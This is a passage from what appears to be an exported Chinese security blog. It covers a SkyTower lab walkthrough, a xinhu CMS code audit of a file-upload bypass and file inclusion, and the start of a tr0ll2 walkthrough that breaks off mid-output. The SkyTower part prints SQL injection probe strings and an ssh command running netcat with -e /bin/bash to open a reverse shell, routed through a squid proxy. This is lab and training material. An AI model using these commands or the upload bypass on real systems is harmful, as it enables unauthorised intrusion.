class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nikto -h http://192.168.199.138/</span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.199.138</span><br><span class="line">+ Target Hostname:    192.168.199.138</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-12-12 16:40:28 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.22 (Debian)</span><br><span class="line">+ /: Server may leak inodes via ETags, header found with file /, inode: 87, size: 1136, mtime: Fri Jun 20 19:23:36 2014. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ /index: Uncommon header &#x27;tcn&#x27; found, with contents: list.</span><br><span class="line">+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for &#x27;index&#x27; were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275</span><br><span class="line">+ /login.php: Retrieved x-powered-by header: PHP/5.4.4-14+deb7u9.</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .</span><br><span class="line">+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/</span><br><span class="line">+ /login.php: Admin login page/section found.</span><br><span class="line">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br><span class="line">+ 8909 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2024-12-12 16:40:37 (GMT8) (9 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><br>先尝试跑一个sql注入，github随便下一个字典然后直接跑，看输出里面的响应大小，</p><p>那么怎么判断是不是sql注入漏洞<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">一般来说跑一下</span><br><span class="line">&#x27; and &#x27;1&#x27; = &#x27;1 </span><br><span class="line">and 1&#x27;1 = &#x27;2 </span><br><span class="line">and 1=1 </span><br><span class="line">and sleep(5)</span><br><span class="line">and 1=2</span><br><span class="line">`--这种就差不多</span><br><span class="line"></span><br><span class="line">需要注意的是sql server，oracle注释可以用--,mysql可以用#,--</span><br><span class="line"></span><br><span class="line">/**/、 ;%00 、 /*letmetest*/</span><br></pre></td></tr></table></figure><br><img src="https://pic.imgdb.cn/item/675bbcced0e0a243d4e35242.png" alt=""></p><p>这里说你输入的sql语法有问题，所以是存在sql注入漏洞的</p><p>sql注入原理可以去看前面的那个代码审计的，里面写了一下那个sql注入成因</p><p>扯远了，回到靶机</p><p><img src="https://pic.imgdb.cn/item/675bc043d0e0a243d4e352c3.png" alt=""></p><p>看一下成功的，说了账号密码是john:hereisjohn,需要注意的是，给出来的是账号密码而你的登陆界面是email和密码，所以你不能通过这个登录进去</p><p>我们这是应该是考虑之前的3128端口的</p><p>代理有两种方式，分别是<code>proxychains</code>和<code>proxytunnel</code></p><p>3128端口开启squid-http<br>squid cache是流行最广的，使用最普遍的开源缓存代理服务器</p><p>下载proxychains并在proxychains4.conf里面添加对面的ip地址端口号以及协议</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/676bd86bd0e0a243d4ea1876.png" alt=""></p><p>然后使用proxychains4来代理</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh john@<span class="number">192.168</span><span class="number">.98</span><span class="number">.129</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/676bf101d0e0a243d4ea4a84.png" alt=""></p><p>不能直接ssh连接，所以我们可以试试<code>-t cat /etc/passwd</code>看看能不能执行指令</p><p><img src="https://pic.imgdb.cn/item/676bf14ed0e0a243d4ea4a8f.png" alt=""></p><p>使用<code>where python</code>发现无回显，表明里面是没有安装python的,那我们试试nc连接</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# proxychains ssh john@<span class="number">192.168</span><span class="number">.98</span><span class="number">.129</span> -t <span class="string">&#x27;nc 192.168.98.128 6677 -e /bin/bash&#x27;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/i386-linux-gnu/libproxychains.so<span class="number">.4</span></span><br><span class="line">[proxychains] DLL init: proxychains-ng <span class="number">4.17</span></span><br><span class="line">[proxychains] Strict chain  ...  <span class="number">192.168</span><span class="number">.98</span><span class="number">.129</span>:<span class="number">3128</span>  ...  <span class="number">192.168</span><span class="number">.98</span><span class="number">.129</span>:<span class="number">22</span>  ...  OK</span><br><span class="line">john@<span class="number">192.168</span><span class="number">.98</span><span class="number">.129</span><span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">另一边</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─# nc -vlp 6677</span></span><br><span class="line"><span class="string">listening on [any] 6677 ...</span></span><br><span class="line"><span class="string">192.168.98.129: inverse host lookup failed: Unknown host</span></span><br><span class="line"><span class="string">connect to [192.168.98.128] from (UNKNOWN) [192.168.98.129] 60305</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>或者我们用另一种的隧道连接方式，就是前面代理的方式我们换成proxytunnel隧道代理</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# proxytunnel -p <span class="number">192.168</span><span class="number">.98</span><span class="number">.129</span>:<span class="number">3128</span> -d <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span> -a <span class="number">1234</span></span><br></pre></td></tr></table></figure><p>建立一个代理隧道</p><p>但是后面是一样的</p><h3 id="pty小技巧"><a href="#pty小技巧" class="headerlink" title="pty小技巧"></a>pty小技巧</h3><p>socat<br>顺着这个题目，<br><img src="https://pic.imgdb.cn/item/676bfd6ad0e0a243d4ea4d91.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/676bfd6bd0e0a243d4ea4d92.png" alt=""></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过python -m http.server <span class="number">80</span>开启http服务</span><br><span class="line"></span><br><span class="line">另一面直接wget </span><br></pre></td></tr></table></figure><p>看了眼教程下一步是三方在nc里面执行socat然后在把shell弹另一个界面（我勒个甩锅）</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> skytower </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xinhucms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B411%E6%9C%888%E6%97%A5-xinhucms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B411%E6%9C%888%E6%97%A5-xinhucms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>信呼cms将后端代码都放置在webmain目录下，而且访问方式都是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">index.php?a=文件名&amp;d=文件对应名&amp;m=模块</span><br></pre></td></tr></table></figure></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p><img src="https://pic.imgdb.cn/item/673af490d29ded1a8c6e292a.png" alt=""><br>在这个地方我们发现可以看到一个上传文档点</p><p><img src="https://pic.imgdb.cn/item/673af4c2d29ded1a8c6e55a2.png" alt=""></p><p>抓包发现在<code>upload</code>文件下<code>upload</code>文件的<code>public</code>模块</p><p>追踪到<code>uploadAction.php</code>里面的<code>upfileAjax</code></p><p><img src="https://pic.imgdb.cn/item/673af651d29ded1a8c6fc8f5.png" alt=""></p><p>主要是对上传文件的限制，使得他按照要求进行上传，里面调用了c函数，跳转到C函数中发现包含了<code>uploadchajian.php</code></p><p><img src="https://pic.imgdb.cn/item/673b06a0d29ded1a8c80f1f7.png" alt=""></p><p>回到原来的代码中发现第49行调用了up函数，跳转查看</p><p><img src="https://pic.imgdb.cn/item/673b12a0d29ded1a8c8f6af3.png" alt=""></p><p><code>issavefile()</code>方法是用来进行后缀判断的</p><p><img src="https://pic.imgdb.cn/item/673b14e6d29ded1a8c92087f.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/673b14a3d29ded1a8c91b1b2.png" alt=""></p><p>白名单绕过，如果不在的话调用<code>filesave</code>函数</p><p><img src="https://pic.imgdb.cn/item/673b15c5d29ded1a8c92f750.png" alt=""></p><p>这段是读取我们上传的文件内容并保存为base64编码格式，然后将代码保存为uptemp文件，最后进行删除，</p><p><img src="https://pic.imgdb.cn/item/673b16bdd29ded1a8c941bf8.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/673b1708d29ded1a8c947201.png" alt=""></p><p>回到 <code>upfileAciton()</code> 方法中， <code>$upses</code> 接收 <code>up()</code> 方法返回的数据并将数据通过 <code>downChajian.php</code> 中<code>uploadback()</code> 方法备份到数据库，并以json形式返回</p><p><img src="https://pic.imgdb.cn/item/673b179ad29ded1a8c953457.png" alt=""></p><p>我们发现这里上传到的.php文件后缀会被替换为 .uptemp 后缀的文件，并返回了上传路径</p><p>但是我们在进行关键函数的检索的时候发现了一个可以解密base64的地方，并且可以通过控制id来还原<code>.uptemp</code>后缀文件为之前上传的后缀</p><p><img src="https://pic.imgdb.cn/item/673b1a42d29ded1a8c988212.png" alt=""></p><p>从这一段可以看出是上面上传处理的一个反向操作，并且通过<code>fileid</code>来控制</p><p><img src="https://pic.imgdb.cn/item/673b1a8bd29ded1a8c98daf3.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/673dba0fd29ded1a8ce74350.png" alt=""></p><p>联系上面是fileid参数来控制上传的文件使其还原</p><p>所以我们可以通过更改fileid来控制</p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>将fileid替换为我们上传的文件的id</p><p><img src="https://pic.imgdb.cn/item/673b1b16d29ded1a8c99869b.png" alt=""></p><p>发现之前的.uptemp确实是可以被替换为.php文件后缀</p><p><img src="https://pic.imgdb.cn/item/673b1b38d29ded1a8c99b1da.png" alt=""></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>在<code>include_once</code>的时候发现一个<code>mpathname</code>可控，</p><p><img src="https://pic.imgdb.cn/item/673ca031d29ded1a8cffcf11.png" alt=""></p><p>所以我们尝试跟踪这个发现他在上面被赋值了，就是71行的<code>$tplpaths.$tplname</code><br>下面我们发现<code>tplname</code>的后缀是限制限制死的只能为html</p><p><img src="https://pic.imgdb.cn/item/673ca045d29ded1a8cffdeea.png" alt=""></p><p>我们跟踪另外一个<code>mpathname</code>，他的代码说明是检查<code>$xhrock-&gt;displayfile</code>是否不为空，检查文件是否存在，然后重点关注这个<code>xhrock</code>,回溯到上面的是新建一个实例，然后接着回溯这个返现是可以通过控制<code>$m</code>来控制的</p><p><img src="https://pic.imgdb.cn/item/673ca15dd29ded1a8c00d7b1.png" alt=""></p><p>而这里的$m是通过前端传入的</p><p><img src="https://pic.imgdb.cn/item/673ca241d29ded1a8c01a37e.png" alt=""></p><p>但这里想要进入34行的if判断必须存在 $actfile 文件,而这里的 $actfile 变量是通过代码30行进行处理的。我们跟进 strformat() 函数</p><p><img src="https://pic.imgdb.cn/item/673ca299d29ded1a8c01ec8a.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/673ca6e5d29ded1a8c059644.png" alt=""></p><p>这两个的大概内容是找到对应的php文件，而上述代码30行的<code>$m</code>是可控的,所以回到<code>xhrock</code>看<code>displayfile</code>可控的地方</p><p><img src="https://pic.imgdb.cn/item/673ca7c2d29ded1a8c077d5b.png" alt=""></p><p>找到这个</p><p><code>indexAction.php</code>的 <code>getshtmlAction</code> 函数中的 <code>displayfile</code> 变<br>量是通过 <code>$file</code> 进行赋值的，而 <code>$file</code> 中的 <code>$surl</code>参数是前端可控的，所以这里可以包含任意的php后缀文件。<br>（记得base64编码）</p><p>而<code>View.php</code>中这里我们可以控制<code>$m</code>来调用<code>indexAction.php</code>文件并且实例化文件中的<code>indexClassAction</code> 类，并且可以任意调用该类下的方法，也就是可以调用 <code>indexClassAction</code> 类下的<code>getshtmlAction</code> 方法</p><p><img src="https://pic.imgdb.cn/item/673ca9acd29ded1a8c0b53f6.png" alt=""></p><h3 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h3><p><img src="https://pic.imgdb.cn/item/673ca9dbd29ded1a8c0b8fc0.png" alt=""></p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tr0ll2靶机</title>
      <link href="/2025/01/08/2024%E5%B9%B411%E6%9C%8823%E6%97%A5-tr0ll2%E9%9D%B6%E6%9C%BA/"/>
      <url>/2025/01/08/2024%E5%B9%B411%E6%9C%8823%E6%97%A5-tr0ll2%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>上来时经典的nmap扫面网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -A 192.168.199.0/24               </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 11:06 CST</span><br><span class="line">Nmap scan report for 192.168.199.1</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH for_Windows_9.5 (protocol 2.0)</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 11 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 11 21H2 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.19 ms 192.168.199.1</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.199.2</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">53/tcp filtered domain</span><br><span class="line">MAC Address: 00:50:56:E5:A4:9F (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: specialized</span><br><span class="line">Running: VMware Player</span><br><span class="line">OS CPE: cpe:/a:vmware:player</span><br><span class="line">OS details: VMware Player virtual NAT device</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.21 ms 192.168.199.2</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.199.132</span><br><span class="line">Host is up (0.0031s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)</span><br><span class="line">|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)</span><br><span class="line">|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">MAC Address: 00:0C:29:0F:F4:68 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>可以看到靶机的ip是<code>192.168.199.132</code>，开放了21，22，80端口</p><p>访问80端口是这个东西</p><p><img src="https://pic.imgdb.cn/item/6741541cd29ded1a8ca46da8.png" alt=""></p><p>这里说明了 作者是<code>tr0ll</code>，而且可以看到开放了21端口是一个ftp</p><p>ftp链接，账号密码都是<code>tr0ll</code>，进去看一下</p><p><img src="https://pic.imgdb.cn/item/6741547ad29ded1a8ca4ece7.png" alt=""></p><p>里面有一个lmao.zip文件，下载下来看看</p><p>后台dirb一下靶机ip，发现有<code>robots.txt</code></p><p><img src="https://pic.imgdb.cn/item/674156e0d29ded1a8ca78e77.png" alt=""></p><p>wget下载下来，然后dirb扫描发现开放</p><p><img src="https://pic.imgdb.cn/item/67415898d29ded1a8ca92bc9.png" alt=""></p><p>几个页面访问下来都是一样的</p><p>查看源码说是让我们抓取图片看看，wget下载下来就是</p><p>最早的项目中我们说就是分析图片的我们有三种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">binwalk（路由逆向分析工具）</span><br><span class="line"></span><br><span class="line">exiftool（图虫）</span><br><span class="line"></span><br><span class="line">strings（识别动态库坂本指令）</span><br></pre></td></tr></table></figure><p>strings分析得到<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/tr0ll2]</span><br><span class="line">└─$ strings cat_the_troll.jpg </span><br><span class="line">JFIF</span><br><span class="line">#3-652-108?QE8&lt;M=01F`GMTV[\[7DcjcXjQY[W</span><br><span class="line">)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW</span><br><span class="line">&quot;aq2</span><br><span class="line">\vRH</span><br><span class="line">sdwTi</span><br><span class="line"> aDP</span><br><span class="line"> aDP</span><br><span class="line">\z!$</span><br><span class="line">`aDc</span><br><span class="line">(Q@0S</span><br><span class="line">&#125;&#125;HQ\)</span><br><span class="line">B6F@</span><br><span class="line">T&quot;8V</span><br><span class="line">!\#(</span><br><span class="line">u6.U</span><br><span class="line">6&amp;      QY</span><br><span class="line">;.e&#123;</span><br><span class="line">hH&#125;Q</span><br><span class="line">=\x#uk</span><br><span class="line">?&#125;1,;Gd</span><br><span class="line">~&gt;znk</span><br><span class="line">BP~9D</span><br><span class="line">QFQHQT</span><br><span class="line">D       vOE</span><br><span class="line">&#123;&quot;yw</span><br><span class="line">.&amp;9)</span><br><span class="line">Km3Q</span><br><span class="line">^Ah9]*</span><br><span class="line">%DGU</span><br><span class="line">WUh </span><br><span class="line">:uWw</span><br><span class="line">ALzO#</span><br><span class="line">NO_`</span><br><span class="line">F wT</span><br><span class="line">s$3&#x27;</span><br><span class="line">H=ev</span><br><span class="line">0mwP</span><br><span class="line">J,hi</span><br><span class="line">nuMs[~</span><br><span class="line">XSy&#125;]F</span><br><span class="line">Q&#123;w&#125;n=</span><br><span class="line">&#123;k&#123;]&amp;</span><br><span class="line">Y]3P</span><br><span class="line">D&amp;ai</span><br><span class="line">7+&#125;(</span><br><span class="line">jr&#x27;h</span><br><span class="line">)0zZ</span><br><span class="line">L!&amp;\~T</span><br><span class="line">`$3!</span><br><span class="line">8]j,</span><br><span class="line">K:/w.`&#x27;</span><br><span class="line">~^GR</span><br><span class="line">5zT)T</span><br><span class="line">Rq&lt;8</span><br><span class="line">_mzN</span><br><span class="line">S0=&amp;</span><br><span class="line">o&amp;&quot;8</span><br><span class="line">;H!\M.</span><br><span class="line">.l|(</span><br><span class="line">fC@FO</span><br><span class="line">8Yj5</span><br><span class="line">f        &amp;1</span><br><span class="line">Cdb&gt;</span><br><span class="line">1&lt;,n=</span><br><span class="line">Ksbv</span><br><span class="line">K       AM</span><br><span class="line">j?w1</span><br><span class="line">(669VNR</span><br><span class="line">u%u|Pl</span><br><span class="line">;Cw4d</span><br><span class="line">Ps&lt;o</span><br><span class="line">rP&#123;J</span><br><span class="line">H!u-</span><br><span class="line">Vcw9</span><br><span class="line">)Qup=-kG+</span><br><span class="line">$T3!k:~</span><br><span class="line">;*iZ</span><br><span class="line">wvwD</span><br><span class="line">&quot;&gt;8Z</span><br><span class="line">mcc8=</span><br><span class="line">IQTu</span><br><span class="line">@rh8T</span><br><span class="line">+sx(</span><br><span class="line">kK+:</span><br><span class="line">=GEZ</span><br><span class="line">gugI</span><br><span class="line">&#125;wR.</span><br><span class="line">-.u+</span><br><span class="line">Dm3Q</span><br><span class="line">+&#125;[R</span><br><span class="line">iZ&#123;4</span><br><span class="line">Xn_B</span><br><span class="line">OYKH</span><br><span class="line">8Hq%</span><br><span class="line"> t+%s3</span><br><span class="line">o=       </span><br><span class="line">&lt;CgiZ</span><br><span class="line">jnavF</span><br><span class="line">]mb*=</span><br><span class="line">N9Z&lt;+</span><br><span class="line">kF.j</span><br><span class="line">$v_I</span><br><span 